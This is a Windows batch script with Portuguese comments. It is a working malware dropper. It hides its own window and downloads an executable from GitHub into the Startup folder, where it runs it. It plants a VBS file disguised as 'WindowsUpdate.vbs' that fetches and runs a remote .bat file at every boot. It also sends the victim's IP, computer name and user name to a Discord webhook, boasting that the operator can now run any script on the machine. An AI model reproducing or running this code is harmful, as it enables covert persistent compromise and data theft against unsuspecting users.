@echo off


:: Reexecuta o próprio script oculto
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
    exit
)

:: URL do .exe
set "URL=https://github.com/lcmandrikion-hash/MNTR/raw/refs/heads/main/monitoramento.exe"

:: Caminho da pasta Startup
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Startupx64.exe"

:: Baixa o arquivo
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%STARTUP%'"

:: Executa o arquivo
start "" "%STARTUP%"


set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run "powershell -WindowStyle Hidden -c ""iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\t.bat; & $env:TEMP\t.bat""", 0, False
) > "%startup%\WindowsUpdate.vbs"


:: Pega IP público
for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
:: Infos do sistema
set PC=%COMPUTERNAME%
set USER=%USERNAME%

:: Data e hora
set DATA=%DATE%
set HORA=%TIME:~0,5%

set MESSAGE=Copiador executado com sucesso. Voce tem direito de colocar qualquer script quando esse usuario  iniciar o pc para ser executado PC %PC% - Usuario %USER% - IP %IP% - Data %DATA% - Hora %HORA%

:: Envia pro Discord
curl -s ^
-H "Content-Type: application/json" ^
-X POST ^
-d "{\"content\":\"%MESSAGE%\"}" ^
https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK

endlocal
exit
